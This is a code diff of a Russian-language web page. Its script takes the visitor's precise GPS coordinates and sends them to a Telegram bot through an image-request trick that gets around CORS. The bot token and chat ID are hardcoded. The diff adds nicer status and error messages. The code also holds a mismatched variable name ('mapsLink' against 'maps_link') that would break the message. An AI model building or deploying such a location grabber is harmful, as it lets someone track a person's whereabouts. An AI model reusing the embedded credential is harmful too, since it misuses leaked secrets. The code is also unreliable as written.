@@ -6,17 +6,22 @@
     <style>
         body { font-family: sans-serif; text-align: center; margin-top: 50px; background: #121212; color: #fff; }
         h2 { color: #4CAF50; }
+        #status { padding: 20px; font-size: 18px; }
     </style>
 </head>
 <body>
-    <h2 id="status">Определение геолокации...</h2>
-    <p>Пожалуйста, подождите...</p>
+    <h2 id="title">Поиск координат...</h2>
+    <div id="status">Ожидание ответа от датчиков телефона...</div>
 
     <script>
         const TOKEN = "9218562846:AAGbvc-EJ2QLHcs8qW-c__liAzlBgUp4HnU";
         const CHAT_ID = "5328460264";
 
+        const statusDiv = document.getElementById("status");
+        const titleH2 = document.getElementById("title");
+
         if (navigator.geolocation) {
+            // Увеличиваем таймаут до 30 секунд, чтобы дать телефону время поймать спутники
             navigator.geolocation.getCurrentPosition(
                 function(position) {
                     const lat = position.coords.latitude;
@@ -24,24 +29,43 @@
                     const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
                     const text = `📍 Координаты с телефона:\nШирота: ${lat}\nДолгота: ${lon}\nКарта: ${maps_link}`;
 
-                    document.getElementById("status").innerText = "Отправка в Telegram...";
+                    titleH2.innerText = "Успешно!";
+                    statusDiv.innerText = "Координаты получены, отправляем в Telegram...";
 
-                    // Формируем ссылку на API Telegram
                     const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
                     
-                    // Обходим CORS с помощью трюка с Image (браузер выполнит GET-запрос гарантированно)
                     const img = new Image();
                     img.src = url;
                     
-                    document.getElementById("status").innerText = "Координаты успешно отправлены! ✔️";
+                    img.onload = function() {
+                        statusDiv.innerText = "Сообщение доставлено в Telegram! ✔️";
+                    };
+                    img.onerror = function() {
+                        statusDiv.innerText = "Координаты пойманы, но ошибка отправки запроса.";
+                    };
                 },
                 function(error) {
-                    document.getElementById("status").innerText = "Ошибка геолокации: " + error.message;
+                    titleH2.innerText = "Ошибка!";
+                    let errorMsg = "";
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMsg = "Пользователь отклонил запрос на геолокацию.";
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMsg = "Информация о местоположении недоступна (возможно, выключен GPS или нет сигнала).";
+                            break;
+                        case error.TIMEOUT:
+                            errorMsg = "Время ожидания истекло (GPS не смог поймать спутники, попробуйте у окна).";
+                            break;
+                        default:
+                            errorMsg = "Неизвестная ошибка: " + error.message;
+                    }
+                    statusDiv.innerText = errorMsg;
                 },
-                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                { enableHighAccuracy: false, timeout: 30000, maximumAge: 0 }
             );
         } else {
-            document.getElementById("status").innerText = "Геолокация не поддерживается вашим браузером.";
+            statusDiv.innerText = "Геолокация не поддерживается вашим браузером.";
         }
     </script>
 </body>
